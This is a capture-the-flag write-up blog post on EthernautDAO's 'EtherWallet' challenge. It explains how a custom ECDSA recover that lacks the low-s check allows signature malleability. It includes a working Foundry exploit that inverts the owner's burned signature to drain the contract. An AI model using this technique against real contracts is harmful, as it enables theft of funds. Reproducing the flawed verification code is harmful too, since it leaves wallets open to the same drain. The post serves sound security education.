---
title: 'EthernautDAO CTF 9 — EtherWallet'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>The goal of the challenge is to be able to drain the contract's balance.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-10-06T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1563889138205528066](https://twitter.com/EthernautDAO/status/1563889138205528066)

## CTF 9: EtherWallet

In this challenge, we need to exploit a contract called [EtherWallet](https://goerli.etherscan.io/address/0x4b90946ab87bf6e1ca1f26b2af2897445f48f877#code). The goal of the challenge is to be able to drain the contract's balance.

Looking at the contract's natspec description, the author said

> Simple wallet contract, anyone can deposit Ether and anyone with a valid signature can withdraw, in case of an emergency

## Study the contracts

The contract has four functions

- The `constructor()` where the owner of the contract is updated with `msg.sender`
- `receive()` that allows the sender to deposit ETH into the contract
- `transferOwnership(address newOwner)` that allow the owner to change the ownership (updating `owner`) of the contract
- `withdraw(bytes memory signature)` that allow a sender with a valid signature to withdraw the whole contact's balance.

If we look at [all the transaction made toward the contract](https://goerli.etherscan.io/address/0x4b90946ab87bf6e1ca1f26b2af2897445f48f877#transactions), we can see that the owner has performed these operations:

1. Deployed the contract funding it with `0.01` ETH
2. Executed `withdraw(signatureGivenByTheOwner)` withdrawing the whole balance
3. Sent directly to the contract `0.2 ETH` to fund again the contract

Why did the owner perform the second and third operations? Well, because it wanted to "burn" the signature to not allow someone else to withdraw the funds (we will see later how the `withdraw` function works)

At this point, the owner of the contract think that the only way to withdraw again would be to first call `transferOwnership` to change the `owner` and execute `withdraw` with a new valid (and not "burned") signature.

Let's review the two most interesting functions to understand if we have any surface of attack

### `transferOwnership(address newOwner)`

```solidity
function transferOwnership(address newOwner) public {
    require(msg.sender == owner, "No permission!");

    address oldOwner = owner;
    owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
}
```

The function allows the current owner to update the contract's `owner`. As a consequence, a new signature must be generated if someone wants to call `withdraw` and withdraw the funds.
I would say that this function is pretty safe, we cannot change the owner without having his/her private key.

### `withdraw(bytes memory signature)`

```solidity
// anyone with a valid signature can call this, in case of an emergency
function withdraw(bytes memory signature) external {
    require(!usedSignatures[signature], "Signature already used!");
    require(ECDSA.recover(keccak256("\x19Ethereum Signed Message:\n32"), signature) == owner, "No permission!");
    usedSignatures[signature] = true;

    uint256 balance = address(this).balance;
    payable(msg.sender).transfer(balance);

    emit Withdraw(msg.sender, balance);
}
```

This function is much more interesting.

- `require(!usedSignatures[signature], "Signature already used!");` checks that the provided signature has not already been used
- `require(ECDSA.recover(keccak256("\x19Ethereum Signed Message:\n32"), signature) == owner, "No permission!");` verify that the `signer` that has signed the `hash` message with the `signature` is the `owner` of the contract. What does it mean if the `signer` and the `owner` match? That the owner itself have signed a message with their private key and have provided you all the information needed to prove that only him/her could have done that.

If all the checks pass the contract, "burn" the signature setting it as used by executing `usedSignatures[signature] = true;` and withdraw all the contract's funds by sending them to `msg.sender`.

It seems that there's no surface of attack because the only available signature for the current owner has been already used and burned by the owner itself in the [transaction 0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548](https://goerli.etherscan.io/tx/0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548).

If you look at the contract, you see that they are using a custom `ECDSA` implementation to verify via `ECDSA.recover` that the signature is valid and has been provided by the `owner` itself.

Is the implementation of the `ECDSA.recover` well-made and safe? As you know, people usually try to use battle tested and known libraries like OpenZeppelin for this very reason.

As we saw already in some previous exploits and CTF signatures, ECDSA and everything around these topics is not easy to understand and can be tricky to use in the correct way.

If you are going to use signatures in your code, you should:

- Know how to use them and verify them in the correct way
- All the checks that should be done in your code to prevent the usage of the same signature
- All the problems that come with signature and what libraries like OpenZeppelin have done to prevent that

We have already explored these topics in some previous blog post, but you can also review them in the section "Further reading" at the end of this blog post.

The main concern that I would have by looking at the custom `ECDSA.recovery` would be if the code has been correctly implemented (given that it's using low-level Yul) and if performs all the checks to avoid what is called "signature malleability".

If you compare the implementation with the [OpenZeppelin ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol), you can spot that the custom code miss a critical check.

```solidity
// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature
// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines
// the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most
// signatures from current libraries generate a unique signature with an s-value in the lower half order.
//
// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value
// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or
// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept
// these malleable signatures as well.
if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
    return (address(0), RecoverError.InvalidSignatureS);
}
```

**Why is that specific check needed?** It's needed to prevent signature malleability! This mean that given a signature, you can slightly modify the value of `v` and `s` to generate an "inverted signature" that would be different but at the same time still valid.

Without that check, we can modify the signature used by the owner to perform the previous `withdraw`. The signature would be different, so the first check in the function would pass but will still be valid, returning the `owner` address when `ECDSA.recover(keccak256("\x19Ethereum Signed Message:\n32"), signature)` is performed in the second check.

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity

function testCompleteLevel() public {
    address player = users[0];
    vm.startPrank(player);

    uint256 playerBalanceBefore = player.balance;
    uint256 walletBalanceBefore = address(level).balance;

    // Let's look at the `withdraw` transaction to gather the signature used by the owner of the contract
    // https://goerli.etherscan.io/tx/0x8ccffd2e4bbef4815ee6be1355d1545831257a12aae203bcff711a28bb8d3548
    bytes
        memory signature = hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c";

    // If we try to withdraw using the same signature the contract should revert
    vm.expectRevert(bytes("Signature already used!"));
    level.withdraw(signature);

    // Now we need to exploit the malleable signature exploit present in the custom ECDSA
    // Implementation inside the EtherWallet contract
    // Let's split the current signature to get back the tuple (uint8 v, bytes32 r, bytes32 s)
    (uint8 v, bytes32 r, bytes32 s) = deconstructSignature(signature);

    // Now we can calculate what should be the "inverted signature"
    bytes32 groupOrder = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    bytes32 invertedS = bytes32(uint256(groupOrder) - uint256(s));
    uint8 invertedV = v == 27 ? 28 : 27;

    // After calculating which is the inverse `s` and `v` we just need to re-create the signature
    bytes memory invertedSignature = abi.encodePacked(r, invertedS, invertedV);

    // And use it to trigger again the withdraw
    // If everything works as expected we should have drained the contract from the 0.2 ETH in its balance
    level.withdraw(invertedSignature);

    vm.stopPrank();

    // Assert we were able to withdraw all the ETH
    assertEq(player.balance, playerBalanceBefore + walletBalanceBefore);
    assertEq(address(level).balance, 0 ether);
}

// utility function to deconstruct a signature returning (v, r, s)
function deconstructSignature(bytes memory signature)
    public
    pure
    returns (
        uint8,
        bytes32,
        bytes32
    )
{
    bytes32 r;
    bytes32 s;
    uint8 v;
    // ecrecover takes the signature parameters, and the only way to get them
    // currently is to use assembly.
    /// @solidity memory-safe-assembly
    assembly {
        r := mload(add(signature, 0x20))
        s := mload(add(signature, 0x40))
        v := byte(0, mload(add(signature, 0x60)))
    }
    return (v, r, s);
}
```

Here is the command I have used to run the test: `forge test --match-contract EtherWalletTest --fork-url <your_rpc_url> --fork-block-number 7475421 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchemy or Infura.

You can read the full solution of the challenge, opening [EtherWallet.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/EtherWallet.t.sol)

## Further reading

- [EIP-191: Signed Data Standard](https://eips.ethereum.org/EIPS/eip-191)
- [OpenZeppelin ECDSA implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)
- [OpenZeppelin ECDSA signature malleability report](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h)
- [SWC-117 Signature Malleability](https://swcregistry.io/docs/SWC-117)
- [Inherent Malleability of ECDSA Signatures](https://www.derpturkey.com/inherent-malleability-of-ecdsa-signatures/)
- [Bitcoin Transaction Malleability](https://eklitzke.org/bitcoin-transaction-malleability)
- [B002: Solidity EC Signature Pitfalls](https://0xsomeone.medium.com/b002-solidity-ec-signature-pitfalls-b24a0f91aef4)
- [OpenZeppelin PR for Signature Malleability](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/1622)
- [ECDSA signature malleability example in solidity](https://github.com/0xbok/malleable-signature-demo)

## Disclaimer

All Solidity code, practices, and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
